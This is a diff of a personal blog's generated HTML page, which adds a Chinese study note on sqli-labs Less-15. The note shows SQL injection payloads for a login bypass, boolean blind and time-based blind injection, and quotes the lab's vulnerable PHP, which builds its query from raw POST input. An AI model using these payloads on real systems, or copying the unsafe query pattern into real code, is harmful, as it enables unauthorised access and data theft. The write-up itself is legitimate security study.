@@ -6,25 +6,34 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="generator" content="han个人博客">
-    <title>Welcome - han个人博客</title>
+    <title>sqli-labs 学习笔记 - han个人博客</title>
     <meta name="author" content="han">
     
     
     
         <link rel="alternate" type="application/atom+xml" title="RSS" href="/atom.xml">
     
-    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"han","sameAs":["https://github.com/","http://stackoverflow.com/users","mailto"],"image":"headimg.jpg"},"articleBody":"","dateCreated":"2019-09-08T22:27:00+08:00","dateModified":"2019-09-08T22:33:10+08:00","datePublished":"2019-09-08T22:27:00+08:00","description":"记录  学习  分享\n","headline":"Welcome","image":["http://d1u9biwaxjngwg.cloudfront.net/welcome-to-tranquilpeak/city-750.jpg","http://d1u9biwaxjngwg.cloudfront.net/welcome-to-tranquilpeak/city-750.jpg"],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/09/08/welcome/"},"publisher":{"@type":"Organization","name":"han","sameAs":["https://github.com/","http://stackoverflow.com/users","mailto"],"image":"headimg.jpg","logo":{"@type":"ImageObject","url":"headimg.jpg"}},"url":"http://yoursite.com/2019/09/08/welcome/","thumbnailUrl":"http://d1u9biwaxjngwg.cloudfront.net/welcome-to-tranquilpeak/city-750.jpg"}</script>
-    <meta name="description" content="记录  学习  分享">
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"han","sameAs":["https://github.com/","http://stackoverflow.com/users","mailto"],"image":"headimg.jpg"},"articleBody":"Abstract: 掌握 sqli-labs 每个关卡的注入原理，熟练使用手工注入和sqlmap 工具的使用，对源代码进行简单分析。\n\n\n\n\n\n\nSQL 注入常用语句UNION SELECT 联合查询1234# 先确定字段数ORDER BY 1,2,3,...,N# 联合查询，确定页面能显示的位置UNION SELECT 1,2,3,user(),version(),...,N\n\nLess-15手动注入\n打开首页如下图\n\n\n\n在查看器中找到 form 表单的名称\n\n\n\n使用 HackBar 以 POST 方式提交数据，随意输入用户名和密码，可以看出，页面提示登录失败。\n\n1uname=123&amp;passwd=123&amp;submit=submit\n\n\n\n尝试使用万能密码登录，\n\n1uname=admin' or 1 #&amp;passwd=123&amp;submit=submit\n\n\n可以看出登录成功。故我们可以利用用户名这块进行 sql 注入。找到注入点后，接下来我们来分析下到底该有哪种注入方式，首先，无论用户是否登录成功，页面均没有可用的数据以及数据库报错显示出来，所以 UNION SELECT 和报错注入显然是不合适的。根据登录成功与否显示的图片不同，故可以使用布尔盲注。\n布尔盲注\n1uname=admin' and ascii(mid((select user()), 1, 1))&gt;0 #&amp;passwd=123&amp;submit=submit\n\n运用 ascii 和 mid 函数时，第一次应该先于 0 比较，因为这样能尽快判断出写入的语句是否存在错误，避免浪费过多时间。\n\n1uname=admin' and ascii(mid((select user()), 1, 1))&gt;120 #&amp;passwd=123&amp;submit=submit\n\n\n规范的做法应该是，第一步先用 count 判断库/表/字段个数，第二步是用 limit 控制把库/表/字段一一输出，然后用 length 判断每个名的长度，第三步用 ascii 和 mid 一一判断名中每个字符的大小。\n时间盲注\n1if(length(user())&gt;1, sleep(1), 1) #&amp;passwd=123&amp;submit=submit\n\n\n可以看出，点击 Execute 后，页面等待一段时间后，显示登录错误，当我们把数字改到 14 后，点击 Execute ，页面立刻执行完毕，显示登录成功。其中原因是 length(user()) 的输出为 14，当 &gt; 后面的数字小于 14 时，if() 函数执行 sleep(1) ，之后返回 0，然后执行如下的 sql 语句。\n1SELECT username, password FROM users WHERE username=&apos;admin&apos; and 0 # and password=123 LIMIT 0,1\n\n后面是永假条件，此时的 SQL 语句返回空。反之，\n1SELECT username, password FROM users WHERE username=&apos;admin&apos; and 1 # and password=123 LIMIT 0,1\n\n源码分析对输入参数做处理的核心代码如下所示：\n1234567891011121314151617181920&lt;?php     if(isset($_POST['uname']) &amp;&amp; isset($_POST['passwd']))&#123;\t$uname=$_POST['uname'];\t$passwd=$_POST['passwd'];\t//logging the connection parameters to a file for analysis.\t$fp=fopen('result.txt','a');\tfwrite($fp,'User Name:'.$uname);\tfwrite($fp,'Password:'.$passwd.\"\\n\");\tfclose($fp);\t// connectivity \t@$sql=\"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1\";\t$result=mysql_query($sql);\t$row = mysql_fetch_array($result);    ?&gt;\n\n","dateCreated":"2019-09-10T08:06:14+08:00","dateModified":"2019-09-10T20:42:50+08:00","datePublished":"2019-09-10T08:06:14+08:00","description":"Abstract: 掌握 sqli-labs 每个关卡的注入原理，熟练使用手工注入和sqlmap 工具的使用，对源代码进行简单分析。","headline":"sqli-labs 学习笔记","image":["https://images.unsplash.com/photo-1530625243345-797b4c1836ee?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=crop&w=676&q=80"],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/09/10/sqli-labs/"},"publisher":{"@type":"Organization","name":"han","sameAs":["https://github.com/","http://stackoverflow.com/users","mailto"],"image":"headimg.jpg","logo":{"@type":"ImageObject","url":"headimg.jpg"}},"url":"http://yoursite.com/2019/09/10/sqli-labs/","keywords":"sqli-labs","thumbnailUrl":"https://images.unsplash.com/photo-1530625243345-797b4c1836ee?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=crop&w=676&q=80"}</script>
+    <meta name="description" content="Abstract: 掌握 sqli-labs 每个关卡的注入原理，熟练使用手工注入和sqlmap 工具的使用，对源代码进行简单分析。">
+<meta name="keywords" content="sqli-labs">
 <meta property="og:type" content="blog">
-<meta property="og:title" content="Welcome">
-<meta property="og:url" content="http://yoursite.com/2019/09/08/welcome/index.html">
+<meta property="og:title" content="sqli-labs 学习笔记">
+<meta property="og:url" content="http://yoursite.com/2019/09/10/sqli-labs/index.html">
 <meta property="og:site_name" content="han个人博客">
-<meta property="og:description" content="记录  学习  分享">
+<meta property="og:description" content="Abstract: 掌握 sqli-labs 每个关卡的注入原理，熟练使用手工注入和sqlmap 工具的使用，对源代码进行简单分析。">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2019-09-08T14:33:10.520Z">
+<meta property="og:image" content="d:%5Cmyproject%5CBlog%5Csource%5Cimages%5C198sqli-labs-less15_1.png">
+<meta property="og:image" content="d:%5Cmyproject%5CBlog%5Csource%5Cimages%5C198sqli-labs-less15_2.png">
+<meta property="og:image" content="d:%5Cmyproject%5CBlog%5Csource%5Cimages%5C198sqli-labs-less15_3.png">
+<meta property="og:image" content="d:%5Cmyproject%5CBlog%5Csource%5Cimages%5C198sqli-labs-less15_4.png">
+<meta property="og:image" content="d:%5Cmyproject%5CBlog%5Csource%5Cimages%5C198sqli-labs-less15_6.png">
+<meta property="og:image" content="d:%5Cmyproject%5CBlog%5Csource%5Cimages%5C198sqli-labs-less15_5.png">
+<meta property="og:image" content="d:%5Cmyproject%5CBlog%5Csource%5Cimages%5C198sqli-labs-less15_7.png">
+<meta property="og:updated_time" content="2019-09-10T12:42:50.196Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Welcome">
-<meta name="twitter:description" content="记录  学习  分享">
+<meta name="twitter:title" content="sqli-labs 学习笔记">
+<meta name="twitter:description" content="Abstract: 掌握 sqli-labs 每个关卡的注入原理，熟练使用手工注入和sqlmap 工具的使用，对源代码进行简单分析。">
+<meta name="twitter:image" content="d:%5Cmyproject%5CBlog%5Csource%5Cimages%5C198sqli-labs-less15_1.png">
     
     
         
@@ -33,12 +42,9 @@
         <meta property="og:image" content="http://yoursite.com/assets/images/headimg.jpg"/>
     
     
-        <meta property="og:image" content="http://d1u9biwaxjngwg.cloudfront.net/welcome-to-tranquilpeak/city-750.jpg"/>
-        <meta class="swiftype" name="image" data-type="enum" content="http://d1u9biwaxjngwg.cloudfront.net/welcome-to-tranquilpeak/city-750.jpg"/>
+        <meta property="og:image" content="https://images.unsplash.com/photo-1530625243345-797b4c1836ee?ixlib=rb-1.2.1&amp;ixid=eyJhcHBfaWQiOjEyMDd9&amp;auto=format&amp;fit=crop&amp;w=676&amp;q=80"/>
+        <meta class="swiftype" name="image" data-type="enum" content="https://images.unsplash.com/photo-1530625243345-797b4c1836ee?ixlib=rb-1.2.1&amp;ixid=eyJhcHBfaWQiOjEyMDd9&amp;auto=format&amp;fit=crop&amp;w=676&amp;q=80"/>
     
-    
-        <meta property="og:image" content="http://d1u9biwaxjngwg.cloudfront.net/welcome-to-tranquilpeak/city-750.jpg"/>
-        <meta class="swiftype" name="image" data-type="enum" content="http://d1u9biwaxjngwg.cloudfront.net/welcome-to-tranquilpeak/city-750.jpg"/>
     
     
     <!--STYLES-->
@@ -48,6 +54,8 @@
 
     
 
+    
+        
     
 </head>
 
@@ -250,35 +258,95 @@
 </nav>
 
             
-        <div class="post-header-cover
-                    text-center
-                    post-header-cover--full"
-             style="background-image:url('http://d1u9biwaxjngwg.cloudfront.net/welcome-to-tranquilpeak/city-750.jpg');"
-             data-behavior="5">
-            
-                <div class="post-header main-content-wrap text-center">
-    
-        <h1 class="post-title">
-            Welcome
-        </h1>
-    
-    
-</div>
-
-            
-        </div>
-
             <div id="main" data-behavior="5"
-                 class="hasCover
+                 class="
                         hasCoverMetaIn
                         ">
                 
 <article class="post">
     
     
+        <div class="post-header main-content-wrap text-center">
+    
+        <h1 class="post-title">
+            sqli-labs 学习笔记
+        </h1>
+    
+    
+        <div class="post-meta">
+    <time datetime="2019-09-10T08:06:14+08:00">
+	
+		    Sep 10, 2019
+    	
+    </time>
+    
+        <span>in </span>
+        
+    <a class="category-link" href="/categories/Web-Security/">Web Security</a>, <a class="category-link" href="/categories/Web-Security/笔记/">笔记</a>
+
+
+    
+</div>
+
+    
+</div>
+
+    
     <div class="post-content markdown">
         <div class="main-content-wrap">
-            <!-- excerpt -->
+            <p><strong>Abstract</strong>: 掌握 <code>sqli-labs</code> 每个关卡的注入原理，熟练使用手工注入和<code>sqlmap</code> 工具的使用，对源代码进行简单分析。</p>
+<a id="more"></a>
+
+<!--export-->
+
+<h1 id="table-of-contents">Table of Contents</h1><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-注入常用语句"><span class="toc-text">SQL 注入常用语句</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#UNION-SELECT-联合查询"><span class="toc-text">UNION SELECT 联合查询</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-15"><span class="toc-text">Less-15</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#手动注入"><span class="toc-text">手动注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#源码分析"><span class="toc-text">源码分析</span></a></li></ol></li></ol>
+
+<h3 id="SQL-注入常用语句"><a href="#SQL-注入常用语句" class="headerlink" title="SQL 注入常用语句"></a><code>SQL</code> 注入常用语句</h3><h4 id="UNION-SELECT-联合查询"><a href="#UNION-SELECT-联合查询" class="headerlink" title="UNION SELECT 联合查询"></a><code>UNION SELECT</code> 联合查询</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 先确定字段数</span><br><span class="line">ORDER BY 1,2,3,...,N</span><br><span class="line"># 联合查询，确定页面能显示的位置</span><br><span class="line">UNION SELECT 1,2,3,user(),version(),...,N</span><br></pre></td></tr></table></figure>
+
+<h3 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h3><h4 id="手动注入"><a href="#手动注入" class="headerlink" title="手动注入"></a>手动注入</h4><ol>
+<li>打开首页如下图</li>
+</ol>
+<p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C198sqli-labs-less15_1.png" alt></p>
+<ol start="2">
+<li>在查看器中找到 <code>form</code> 表单的名称</li>
+</ol>
+<p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C198sqli-labs-less15_2.png" alt></p>
+<ol start="3">
+<li>使用 <code>HackBar</code> 以 <code>POST</code> 方式提交数据，随意输入用户名和密码，可以看出，页面提示登录失败。</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=123&amp;passwd=123&amp;submit=submit</span><br></pre></td></tr></table></figure>
+
+<p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C198sqli-labs-less15_3.png" alt></p>
+<ol start="4">
+<li>尝试使用万能密码登录，</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin<span class="string">' or 1 #&amp;passwd=123&amp;submit=submit</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C198sqli-labs-less15_4.png" alt></p>
+<p>可以看出登录成功。故我们可以利用用户名这块进行 <code>sql</code> 注入。找到注入点后，接下来我们来分析下到底该有哪种注入方式，首先，无论用户是否登录成功，页面均没有可用的数据以及数据库报错显示出来，所以 <code>UNION SELECT</code> 和报错注入显然是不合适的。根据登录成功与否显示的图片不同，故可以使用布尔盲注。</p>
+<p>布尔盲注</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin<span class="string">' and ascii(mid((select user()), 1, 1))&gt;0 #&amp;passwd=123&amp;submit=submit</span></span><br></pre></td></tr></table></figure>
+
+<p>运用 <code>ascii</code> 和 <code>mid</code> 函数时，第一次应该先于 <code>0</code> 比较，因为这样能尽快判断出写入的语句是否存在错误，避免浪费过多时间。</p>
+<p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C198sqli-labs-less15_6.png" alt></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin<span class="string">' and ascii(mid((select user()), 1, 1))&gt;120 #&amp;passwd=123&amp;submit=submit</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C198sqli-labs-less15_5.png" alt></p>
+<p>规范的做法应该是，第一步先用 <code>count</code> 判断库/表/字段个数，第二步是用 <code>limit</code> 控制把库/表/字段一一输出，然后用 <code>length</code> 判断每个名的长度，第三步用 <code>ascii</code> 和 <code>mid</code> 一一判断名中每个字符的大小。</p>
+<p>时间盲注</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(length(user())&gt;1, sleep(1), 1) <span class="comment">#&amp;passwd=123&amp;submit=submit</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C198sqli-labs-less15_7.png" alt></p>
+<p>可以看出，点击 <code>Execute</code> 后，页面等待一段时间后，显示登录错误，当我们把数字改到 <code>14</code> 后，点击 <code>Execute</code> ，页面立刻执行完毕，显示登录成功。其中原因是 <code>length(user())</code> 的输出为 <code>14</code>，当 <code>&gt;</code> 后面的数字小于 <code>14</code> 时，<code>if()</code> 函数执行 <code>sleep(1)</code> ，之后返回 <code>0</code>，然后执行如下的 <code>sql</code> 语句。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT username, password FROM users WHERE username=&apos;admin&apos; and 0 # and password=123 LIMIT 0,1</span><br></pre></td></tr></table></figure>
+
+<p>后面是永假条件，此时的 <code>SQL</code> 语句返回空。反之，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT username, password FROM users WHERE username=&apos;admin&apos; and 1 # and password=123 LIMIT 0,1</span><br></pre></td></tr></table></figure>
+
+<h4 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h4><p>对输入参数做处理的核心代码如下所示：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'uname'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	$uname=$_POST[<span class="string">'uname'</span>];</span><br><span class="line">	$passwd=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line"></span><br><span class="line">	<span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">	$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">	fwrite($fp,<span class="string">'User Name:'</span>.$uname);</span><br><span class="line">	fwrite($fp,<span class="string">'Password:'</span>.$passwd.<span class="string">"\n"</span>);</span><br><span class="line">	fclose($fp);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// connectivity </span></span><br><span class="line">	@$sql=<span class="string">"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1"</span>;</span><br><span class="line">	$result=mysql_query($sql);</span><br><span class="line">	$row = mysql_fetch_array($result);</span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
             
 
 
@@ -286,7 +354,114 @@
     </div>
     <div id="post-footer" class="post-footer main-content-wrap">
         
+            <div class="post-footer-tags">
+                <span class="text-color-light text-small">TAGGED IN</span><br/>
+                
+    <a class="tag tag--primary tag--small t-link" href="/tags/sqli-labs/">sqli-labs</a>
+
+            </div>
         
+        
+            <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/2019/09/11/welcome/"
+                    data-tooltip="Welcome"
+                    aria-label="PREVIOUS: Welcome"
+                >
+                    
+                        <i class="fa fa-angle-left" aria-hidden="true"></i>
+                        <span class="hide-xs hide-sm text-small icon-ml">PREVIOUS</span>
+                    </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/2019/09/07/sqlSum/"
+                    data-tooltip="SQL 注入总结"
+                    aria-label="NEXT: SQL 注入总结"
+                >
+                    
+                        <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
+                        <i class="fa fa-angle-right" aria-hidden="true"></i>
+                    </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a
+                class="post-action-btn btn btn--default btn-open-shareoptions"
+                href="#btn-open-shareoptions"
+                aria-label="Share this post"
+            >
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/09/10/sqli-labs/"
+                    title="Share on Facebook"
+                    aria-label="Share on Facebook"
+                >
+                    <i class="fab fa-facebook" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/09/10/sqli-labs/"
+                    title="Share on Twitter"
+                    aria-label="Share on Twitter"
+                >
+                    <i class="fab fa-twitter" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://plus.google.com/share?url=http://yoursite.com/2019/09/10/sqli-labs/"
+                    title="Share on Google+"
+                    aria-label="Share on Google+"
+                >
+                    <i class="fab fa-google-plus" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+            
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#table-of-contents" aria-label="Table of Contents">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
+</div>
+
+
+        
+        
+            
         
     </div>
 </article>
@@ -300,6 +475,154 @@
 </footer>
 
             </div>
+            
+                <div id="bottom-bar" class="post-bottom-bar" data-behavior="5">
+                    <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/2019/09/11/welcome/"
+                    data-tooltip="Welcome"
+                    aria-label="PREVIOUS: Welcome"
+                >
+                    
+                        <i class="fa fa-angle-left" aria-hidden="true"></i>
+                        <span class="hide-xs hide-sm text-small icon-ml">PREVIOUS</span>
+                    </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/2019/09/07/sqlSum/"
+                    data-tooltip="SQL 注入总结"
+                    aria-label="NEXT: SQL 注入总结"
+                >
+                    
+                        <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
+                        <i class="fa fa-angle-right" aria-hidden="true"></i>
+                    </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a
+                class="post-action-btn btn btn--default btn-open-shareoptions"
+                href="#btn-open-shareoptions"
+                aria-label="Share this post"
+            >
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/09/10/sqli-labs/"
+                    title="Share on Facebook"
+                    aria-label="Share on Facebook"
+                >
+                    <i class="fab fa-facebook" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/09/10/sqli-labs/"
+                    title="Share on Twitter"
+                    aria-label="Share on Twitter"
+                >
+                    <i class="fab fa-twitter" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://plus.google.com/share?url=http://yoursite.com/2019/09/10/sqli-labs/"
+                    title="Share on Google+"
+                    aria-label="Share on Google+"
+                >
+                    <i class="fab fa-google-plus" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+            
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#table-of-contents" aria-label="Table of Contents">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
+</div>
+
+
+                </div>
+                
+    <div id="share-options-bar" class="share-options-bar" data-behavior="5">
+        <i id="btn-close-shareoptions" class="fa fa-times"></i>
+        <ul class="share-options">
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/09/10/sqli-labs/"
+                        aria-label="Share on Facebook"
+                    >
+                        <i class="fab fa-facebook" aria-hidden="true"></i><span>Share on Facebook</span>
+                    </a>
+                </li>
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/09/10/sqli-labs/"
+                        aria-label="Share on Twitter"
+                    >
+                        <i class="fab fa-twitter" aria-hidden="true"></i><span>Share on Twitter</span>
+                    </a>
+                </li>
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://plus.google.com/share?url=http://yoursite.com/2019/09/10/sqli-labs/"
+                        aria-label="Share on Google+"
+                    >
+                        <i class="fab fa-google-plus" aria-hidden="true"></i><span>Share on Google+</span>
+                    </a>
+                </li>
+            
+        </ul>
+    </div>
+
+
             
         </div>
         
@@ -698,7 +1021,7 @@
                 data-message-zero="no post found"
                 data-message-one="1 post found"
                 data-message-other="{n} posts found">
-                58 posts found
+                59 posts found
             </p>
         </div>
     </div>
@@ -711,6 +1034,8 @@
 <script src="/assets/js/script-miftf8se61zspg5fcsur8f7clgivo7gvevo5wqy4l6pigmbhx9ujvpue2enp.min.js"></script>
 <!--SCRIPTS END-->
 
+
+    
 
 
 
